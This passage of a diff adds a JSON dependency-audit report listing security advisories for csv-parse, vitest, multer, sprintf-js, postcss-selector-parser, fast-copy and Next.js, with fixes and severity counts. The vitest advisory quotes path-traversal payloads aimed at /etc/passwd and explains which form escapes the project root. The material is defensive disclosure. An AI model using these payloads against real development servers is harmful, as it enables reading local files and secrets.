+        {
+          "version": "5.6.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/adaltas/node-csv/security/advisories/GHSA-8cw4-87c7-c6xx\n- https://nvd.nist.gov/vuln/detail/CVE-2026-85063\n- https://github.com/adaltas/node-csv/issues/496\n- https://github.com/adaltas/node-csv/pull/497\n- https://github.com/adaltas/node-csv/commit/eb4d1484589c976dcb977db8dd0b90e015a6f66e\n- https://github.com/advisories/GHSA-8cw4-87c7-c6xx",
+      "created": "2026-09-08T18:01:39.000Z",
+      "id": 1193670,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nWith columns: true and group_columns_by_name: true, a duplicated __proto__  header causes the duplicate-column branch to assign an array to obj['__proto__'], invoking the __proto__ setter and replacing the parsed record object's prototype with attacker-controlled data. Fixed in 7.0.2 (Object.hasOwn duplicate check + Object.defineProperty assignment).\n\n### Patches\nThe problem been patched.\n\n### Workarounds\nDisable usage of both the columns and  group_columns_by_name options.\n\n### References\nissue #496, PR #497",
+      "reported_by": null,
+      "title": "node-csv: Prototype replacement still reachable via columns path",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-85063"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "csv-parse",
+      "vulnerable_versions": "<7.0.2",
+      "github_advisory_id": "GHSA-8cw4-87c7-c6xx",
+      "recommendation": "Upgrade to version 7.0.2 or later",
+      "patched_versions": ">=7.0.2",
+      "updated": "2026-09-08T18:01:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-8cw4-87c7-c6xx"
+    },
+    "1193683": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84373\n- https://github.com/vitest-dev/vitest/pull/10972\n- https://github.com/vitest-dev/vitest/pull/10974\n- https://github.com/vitest-dev/vitest/commit/51edf2b072902aec6d30c90ebaafd8f121c6f9d8\n- https://github.com/vitest-dev/vitest/commit/8ff9b9a9efca7c6cfd5243569440de8d7a33aec4\n- https://github.com/vitest-dev/vitest/commit/fe5a11d3ceac5ec10d6d7d21a46d4caca132c48f\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.11\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-rc.2\n- https://github.com/advisories/GHSA-82fw-gwwq-j7x9",
+      "created": "2026-09-08T20:46:45.000Z",
+      "id": 1193683,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`@vitest/mocker` registers a redirect mock's target path without validating it\nagainst the dev server's file-serving allowlist. An attacker who can reach the\ndev server's WebSocket can register a redirect mock pointing outside the project\nroot; when the mocked module is requested, the plugin's `load` hook returns\n`readFile(<attacker path>)` as the module source, disclosing local files.\n\nThis is exploitable **without authentication** only through the public\n`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev\nservers), which register the handler on Vite's unauthenticated HMR socket.\nVitest's own browser mode registers mocks over a **token-authenticated** RPC and\nis not remotely reachable by default (see Scope).\n\n## Affected code\n`packages/mocker/src/node/interceptorPlugin.ts`.\n\nThe `load` hook is the file-read sink:\n\n```ts\nif (mock.type === 'redirect') {\n  return readFile(mock.redirect, 'utf-8')\n}\n```\n\n`mock.redirect` is derived from client input at registration time with no\nboundary check:\n\n```ts\nif (event.type === 'redirect') {\n  const redirectUrl = new URL(event.redirect)\n  event.redirect = join(server.config.root, redirectUrl.pathname)\n}\nregistry.register(event)\n```\n\nThere is no `server.fs.allow` / `server.fs.deny` check and no assertion that the\nresolved path stays within the project root.\n\n## Registration paths and trust boundaries\n- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In\n  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', …)`\n  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin\n  check, so any client that can reach it can register a redirect mock. This is\n  the path the \"unauthenticated\" impact applies to.\n- **Vitest browser mode (authenticated).** Mocks register over the browser RPC\n  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a\n  random `api.token`). The interceptor's `configureServer` socket is not used for\n  registration here (in v5 it does not run at all, as the plugin is injected per\n  environment). The same missing boundary check exists on the authenticated RPC\n  path, but reaching it requires the token, so it is not a remote-unauthenticated\n  read.\n\n## Path handling\n`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**\nconfine reads to the root:\n\n- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,\n  so `..` segments are collapsed and the result stays under the root. Payloads of\n  the form `file:///../../etc/passwd` do **not** escape.\n- A non-special (opaque) scheme preserves `..` in `pathname`, so\n  `join(root, \"../../…/etc/passwd\")` resolves outside the root and reads an\n  arbitrary file.\n\nEven without escaping the root, the missing `server.fs` check allows reading any\nin-root file the dev server would otherwise refuse to serve (for example an\nin-root `.env` or source that is denied by `server.fs.deny`).\n\n## Scope / preconditions\n- This is a **development-server** issue. The dev server binds to `localhost` by\n  default and is not reachable from the network unless the developer exposes it\n  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).\n- A raw (non-browser) client against a reachable server bypasses browser origin\n  and CORS protections entirely and can both register the mock and read the\n  response.\n- A browser-based drive-by against a localhost server is substantially mitigated\n  by Vite defaults: the default CORS origin allowlist is limited to `localhost`\n  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page\n  cannot read the file contents back.\n\n## Impact\nDisclosure of local files readable by the dev-server process (source, in-root\n`.env`/secrets, and, via the opaque-scheme payload, files outside the project\nroot). No integrity or availability impact.\n\n## Affected versions\nPresent since `@vitest/mocker` was introduced.\n\n- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and\n  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.\n- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not\n  maintained and are not planned to receive the fix.\n\n## Fix\nValidate the resolved redirect target against Vite's file-serving allowlist\n(`isFileLoadingAllowed`) before registering it, at every registration site, and\nstop registering the interceptor WebSocket events in Vitest's browser mode\n(mocks there flow through the authenticated RPC).",
+      "reported_by": null,
+      "title": "Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84373"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vitest",
+      "vulnerable_versions": ">=2.1.0 <4.1.11",
+      "github_advisory_id": "GHSA-82fw-gwwq-j7x9",
+      "recommendation": "Upgrade to version 4.1.11 or later",
+      "patched_versions": ">=4.1.11",
+      "updated": "2026-09-08T20:46:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-82fw-gwwq-j7x9"
+    },
+    "1193684": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-84373\n- https://github.com/vitest-dev/vitest/pull/10972\n- https://github.com/vitest-dev/vitest/pull/10974\n- https://github.com/vitest-dev/vitest/commit/51edf2b072902aec6d30c90ebaafd8f121c6f9d8\n- https://github.com/vitest-dev/vitest/commit/8ff9b9a9efca7c6cfd5243569440de8d7a33aec4\n- https://github.com/vitest-dev/vitest/commit/fe5a11d3ceac5ec10d6d7d21a46d4caca132c48f\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.11\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.0-rc.2\n- https://github.com/advisories/GHSA-82fw-gwwq-j7x9",
+      "created": "2026-09-08T20:46:45.000Z",
+      "id": 1193684,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n`@vitest/mocker` registers a redirect mock's target path without validating it\nagainst the dev server's file-serving allowlist. An attacker who can reach the\ndev server's WebSocket can register a redirect mock pointing outside the project\nroot; when the mocked module is requested, the plugin's `load` hook returns\n`readFile(<attacker path>)` as the module source, disclosing local files.\n\nThis is exploitable **without authentication** only through the public\n`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev\nservers), which register the handler on Vite's unauthenticated HMR socket.\nVitest's own browser mode registers mocks over a **token-authenticated** RPC and\nis not remotely reachable by default (see Scope).\n\n## Affected code\n`packages/mocker/src/node/interceptorPlugin.ts`.\n\nThe `load` hook is the file-read sink:\n\n```ts\nif (mock.type === 'redirect') {\n  return readFile(mock.redirect, 'utf-8')\n}\n```\n\n`mock.redirect` is derived from client input at registration time with no\nboundary check:\n\n```ts\nif (event.type === 'redirect') {\n  const redirectUrl = new URL(event.redirect)\n  event.redirect = join(server.config.root, redirectUrl.pathname)\n}\nregistry.register(event)\n```\n\nThere is no `server.fs.allow` / `server.fs.deny` check and no assertion that the\nresolved path stays within the project root.\n\n## Registration paths and trust boundaries\n- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In\n  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', …)`\n  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin\n  check, so any client that can reach it can register a redirect mock. This is\n  the path the \"unauthenticated\" impact applies to.\n- **Vitest browser mode (authenticated).** Mocks register over the browser RPC\n  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a\n  random `api.token`). The interceptor's `configureServer` socket is not used for\n  registration here (in v5 it does not run at all, as the plugin is injected per\n  environment). The same missing boundary check exists on the authenticated RPC\n  path, but reaching it requires the token, so it is not a remote-unauthenticated\n  read.\n\n## Path handling\n`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**\nconfine reads to the root:\n\n- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,\n  so `..` segments are collapsed and the result stays under the root. Payloads of\n  the form `file:///../../etc/passwd` do **not** escape.\n- A non-special (opaque) scheme preserves `..` in `pathname`, so\n  `join(root, \"../../…/etc/passwd\")` resolves outside the root and reads an\n  arbitrary file.\n\nEven without escaping the root, the missing `server.fs` check allows reading any\nin-root file the dev server would otherwise refuse to serve (for example an\nin-root `.env` or source that is denied by `server.fs.deny`).\n\n## Scope / preconditions\n- This is a **development-server** issue. The dev server binds to `localhost` by\n  default and is not reachable from the network unless the developer exposes it\n  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).\n- A raw (non-browser) client against a reachable server bypasses browser origin\n  and CORS protections entirely and can both register the mock and read the\n  response.\n- A browser-based drive-by against a localhost server is substantially mitigated\n  by Vite defaults: the default CORS origin allowlist is limited to `localhost`\n  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page\n  cannot read the file contents back.\n\n## Impact\nDisclosure of local files readable by the dev-server process (source, in-root\n`.env`/secrets, and, via the opaque-scheme payload, files outside the project\nroot). No integrity or availability impact.\n\n## Affected versions\nPresent since `@vitest/mocker` was introduced.\n\n- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and\n  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.\n- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not\n  maintained and are not planned to receive the fix.\n\n## Fix\nValidate the resolved redirect target against Vite's file-serving allowlist\n(`isFileLoadingAllowed`) before registering it, at every registration site, and\nstop registering the interceptor WebSocket events in Vitest's browser mode\n(mocks there flow through the authenticated RPC).",
+      "reported_by": null,
+      "title": "Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84373"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0 <4.1.11",
+      "github_advisory_id": "GHSA-82fw-gwwq-j7x9",
+      "recommendation": "Upgrade to version 4.1.11 or later",
+      "patched_versions": ">=4.1.11",
+      "updated": "2026-09-08T20:46:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-82fw-gwwq-j7x9"
+    },
+    "1239935": {
+      "findings": [
+        {
+          "version": "2.3.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-3pph-fpjx-jg34\n- https://nvd.nist.gov/vuln/detail/CVE-2026-88932\n- https://github.com/expressjs/multer/commit/53337f9713619ef3381ee6b4e541f926dbaac305\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.4.0\n- https://github.com/advisories/GHSA-3pph-fpjx-jg34",
+      "created": "2026-09-28T21:34:58.000Z",
+      "id": 1239935,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nMulter's `diskStorage` can leave complete, orphaned files on disk when a multipart upload is aborted in the brief window before the storage engine assigns the file path. This is an incomplete fix of CVE-2026-5038: the earlier cleanup removes only in-flight uploads that already have a path, so an upload aborted inside that window is written to disk with nothing left to remove it, and the application is not given a handle to clean it up. An unauthenticated attacker sending aborted requests to any route backed by disk storage can accumulate orphaned files until the upload directory or the shared system temporary directory is exhausted. An asynchronous `destination` or `filename` widens the window.\n\n### Patches\n\nUsers should upgrade to `2.4.0` or higher.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via orphaned disk writes on aborted uploads",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-88932"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "multer",
+      "vulnerable_versions": ">=2.2.0 <2.4.0",
+      "github_advisory_id": "GHSA-3pph-fpjx-jg34",
+      "recommendation": "Upgrade to version 2.4.0 or later",
+      "patched_versions": ">=2.4.0",
+      "updated": "2026-09-28T21:34:59.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-3pph-fpjx-jg34"
+    },
+    "1241202": {
+      "findings": [
+        {
+          "version": "1.0.3",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-97058\n- https://github.com/alexei/sprintf.js/issues/237\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L17\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L84-L90\n- https://www.vulncheck.com/advisories/sprintf-js-through-1.1.3-denial-of-service-via-unbounded-precision\n- https://github.com/advisories/GHSA-hp3w-g68c-fv3c",
+      "created": "2026-09-24T15:31:31.000Z",
+      "id": 1241202,
+      "npm_advisory_id": null,
+      "overview": "sprintf-js through 1.1.3 passes unbounded precision specifiers to toFixed, toExponential, and toPrecision methods without validation, causing uncaught RangeError exceptions. Attackers who control format strings can inject precision values exceeding ECMAScript limits to abort calling operations with minimal payload.",
+      "reported_by": null,
+      "title": "sprintf-js vulnerable to denial of service through unbounded precision specifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-97058"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "sprintf-js",
+      "vulnerable_versions": "<=1.1.3",
+      "github_advisory_id": "GHSA-hp3w-g68c-fv3c",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-10-05T23:47:35.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-1284"
+      ],
+      "url": "https://github.com/advisories/GHSA-hp3w-g68c-fv3c"
+    },
+    "1241232": {
+      "findings": [
+        {
+          "version": "6.1.4",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss-selector-parser/security/advisories/GHSA-rj75-hqrm-r3gf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104844\n- https://github.com/postcss/postcss-selector-parser/commit/62b191792df0a0bc56062e5a875bc74aae2a51cd\n- https://github.com/postcss/postcss-selector-parser/releases/tag/7.1.6\n- https://github.com/advisories/GHSA-rj75-hqrm-r3gf",
+      "created": "2026-10-05T22:53:54.000Z",
+      "id": 1241232,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`.` and `#` are not word delimiters in the tokenizer, so a flat selector such as\n`.a.a.a...` reaches `splitWord()` as a single word token carrying n class or id\nindexes. Three passes scanned those index arrays linearly for every index,\nmaking the parse O(n^2) in the number of indexes rather than in input length:\n`uniqs()`, the `indices.forEach` loop, and the Sass-interpolation filter.\nParsing a 400 KB flat selector took ~34 s on a modern laptop, fully occupying a\nsingle thread. A benign selector of identical byte size parses in tens of\nmilliseconds, so the cost is driven by the index count, not the input size.\nThe nesting depth of such a selector is 0, so the `maxNestingDepth` guard added\nin 7.1.3 offers no protection.\n\nReachability is deployment dependent. Only consumers that parse untrusted,\nattacker-supplied selectors synchronously in a request path are exposed, for\nexample CSS sanitizers, CSS-in-JS services and online playgrounds. Ordinary\nbuild-time use on trusted sources is not affected.\n\n### Patches\n\nFixed in 7.1.6. The three passes now use Set membership tests, making parsing\nlinear in the number of indexes. There is no behaviour change: parsing is\nbyte-identical on a differential corpus of 8413 selectors.\n\n### Workarounds\n\nCap the size of selectors accepted from untrusted sources before parsing.",
+      "reported_by": null,
+      "title": "PostCSS: Quadratic complexity in flat selector parsing allows CPU exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104844"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss-selector-parser",
+      "vulnerable_versions": "<7.1.6",
+      "github_advisory_id": "GHSA-rj75-hqrm-r3gf",
+      "recommendation": "Upgrade to version 7.1.6 or later",
+      "patched_versions": ">=7.1.6",
+      "updated": "2026-10-05T22:53:57.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-rj75-hqrm-r3gf"
+    },
+    "1241257": {
+      "findings": [
+        {
+          "version": "4.0.4",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/planttheidea/fast-copy/security/advisories/GHSA-jggr-w7fw-pc2j\n- https://github.com/planttheidea/fast-copy/pull/137\n- https://github.com/planttheidea/fast-copy/pull/138\n- https://github.com/planttheidea/fast-copy/pull/139\n- https://github.com/planttheidea/fast-copy/commit/359c00884ae8ae31f10925fd0e2fc66661db6cef\n- https://github.com/planttheidea/fast-copy/commit/caa7caace65767dfe252f0dc5115d82c99ca16b9\n- https://github.com/planttheidea/fast-copy/commit/dedf465e5329fbd149f13b53521af962d16ff8df\n- https://github.com/planttheidea/fast-copy/releases/tag/v2.2.0\n- https://github.com/planttheidea/fast-copy/releases/tag/v3.1.0\n- https://github.com/planttheidea/fast-copy/releases/tag/v4.1.0\n- https://github.com/advisories/GHSA-jggr-w7fw-pc2j",
+      "created": "2026-10-05T22:52:09.000Z",
+      "id": 1241257,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`fast-copy` traverses values recursively with no bound on depth. Copying a sufficiently deeply-nested value exhausts the JavaScript call stack and throws a native `RangeError: Maximum call stack size exceeded` from inside the library.\n\n## Details\n\nBoth `copy` and `copyStrict` recurse once per level of nesting. The value does not need to be circular (circular references were already handled correctly via an internal cache) and it does not need to be large. A plain object nested a few thousand levels deep is only a few\nkilobytes of equivalent JSON.\n\nMeasured depths at which copying begins to fail (Node.js, V8; the exact ceiling varies with JIT state and the stack available to the environment):\n\n| Call                 | Last depth that copies successfully |\n| -------------------- | ----------------------------------- |\n| `copy(object)`       | 2811                                |\n| `copy(array)`        | 3983                                |\n| `copyStrict(object)` | 1874                                |\n| `copyStrict(array)`  | 1874                                |\n\n`JSON.parse` is iterative and parses deeply-nested input without difficulty, so a payload that deserializes cleanly can fail in a subsequent `copy` call.\n\n## Impact\n\nThe failure is a synchronous, catchable `RangeError` confined to the `copy` call that received the value. There are no memory safety concerns, no data exposure, and no effect on state outside that call. In a typical server the result is a failed request rather than a failed process.\n\nApplications that call `copy` on externally-supplied data, such as request bodies, cached payloads, merged configuration, etc., do not expect a clone helper to throw may surface this as an unhandled error.\n\n## Patches\n\nFixed in 4.1.0, and backported to 3.1.0 and 2.2.0 so that every major line has a patch available without requiring a breaking upgrade.\n\nTraversal is now bounded by a `maxDepth` option, defaulting to `1000`, which sits below the native limit in standard environments. Exceeding it throws `MaxDepthExceededError`, which carries the limit that was exceeded and extends `RangeError` so existing handling continues to match.\n\nThe limit is configurable for consumers with legitimately deep data. On `3.x` and `4.x` it is set when creating a copier:\n\n```js\nimport { createCopier } from 'fast-copy';\n\nexport const copy = createCopier({ maxDepth: 5000 });\n```\n\nOn `2.x` it is passed per call, and the error is a property of the exported function rather than a named export:\n\n```js\nimport copy from 'fast-copy';\n\ncopy(value, { maxDepth: 5000 });\n// detection: error instanceof copy.MaxDepthExceededError\n```\n\nIn legacy environments without `Object.setPrototypeOf`, `instanceof MaxDepthExceededError` cannot be supported; check `error.name === 'MaxDepthExceededError'` or `error instanceof RangeError` instead.",
+      "reported_by": null,
+      "title": "fast-copy: Stack exhaustion in fast-copy when copying deeply-nested values",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-copy",
+      "vulnerable_versions": ">=4.0.0 <4.1.0",
+      "github_advisory_id": "GHSA-jggr-w7fw-pc2j",
+      "recommendation": "Upgrade to version 4.1.0 or later",
+      "patched_versions": ">=4.1.0",
+      "updated": "2026-10-05T22:52:12.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-jggr-w7fw-pc2j"
+    },
+    "1241491": {
+      "findings": [
+        {
+          "version": "15.5.25",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-4jqv-mc3x-m676\n- https://nvd.nist.gov/vuln/detail/CVE-2026-94543\n- https://github.com/vercel/next.js/commit/52c94abdd2ea5f416f5e8353ea8a2edd3fe311b8\n- https://github.com/vercel/next.js/commit/719e4c67d6e92df60246f95e1d96e2dd60789a52\n- https://github.com/vercel/next.js/releases/tag/v15.5.27\n- https://github.com/vercel/next.js/releases/tag/v16.3.8\n- https://github.com/advisories/GHSA-4jqv-mc3x-m676",
+      "created": "2026-10-07T20:32:06.000Z",
+      "id": 1241491,
+      "npm_advisory_id": null,
+      "overview": "Self-hosted Next.js applications that use the Pages Router with statically generated (SSG) or incrementally regenerated (ISR) pages can have a page's cache entry replaced with content from a different route, causing the affected page to serve wrong content to every visitor until the entry is revalidated. Applications deployed on Vercel are not affected.",
+      "reported_by": null,
+      "title": "Next.js has cache poisoning of SSG and ISR pages in self-hosted applications",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-94543"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <15.5.27",
+      "github_advisory_id": "GHSA-4jqv-mc3x-m676",
+      "recommendation": "Upgrade to version 15.5.27 or later",
+      "patched_versions": ">=15.5.27",
+      "updated": "2026-10-07T20:32:07.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-4jqv-mc3x-m676"
+    },
+    "1241494": {
+      "findings": [
+        {
+          "version": "15.5.25",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mcj8-r9mp-w47p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-94484\n- https://github.com/vercel/next.js/commit/52c94abdd2ea5f416f5e8353ea8a2edd3fe311b8\n- https://github.com/vercel/next.js/commit/719e4c67d6e92df60246f95e1d96e2dd60789a52\n- https://github.com/vercel/next.js/releases/tag/v15.5.27\n- https://github.com/vercel/next.js/releases/tag/v16.3.8\n- https://github.com/advisories/GHSA-mcj8-r9mp-w47p",
+      "created": "2026-10-07T20:31:13.000Z",
+      "id": 1241494,
+      "npm_advisory_id": null,
+      "overview": "Next.js applications that use a root-level catch-all page together with statically generated or Incremental Static Regeneration routes can have their shared response cache poisoned by a single unauthenticated crafted request.",
+      "reported_by": null,
+      "title": "Next.js has cache poisoning in SSG/ISR rendering that leads to cross-user content substitution and persistent denial of service",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-94484"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.0.0 <15.5.27",
+      "github_advisory_id": "GHSA-mcj8-r9mp-w47p",
+      "recommendation": "Upgrade to version 15.5.27 or later",
+      "patched_versions": ">=15.5.27",
+      "updated": "2026-10-07T20:31:15.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-mcj8-r9mp-w47p"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 3,
+      "moderate": 19,
+      "high": 1,
+      "critical": 0
+    },
+    "dependencies": 1420,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1420
+  }
+}
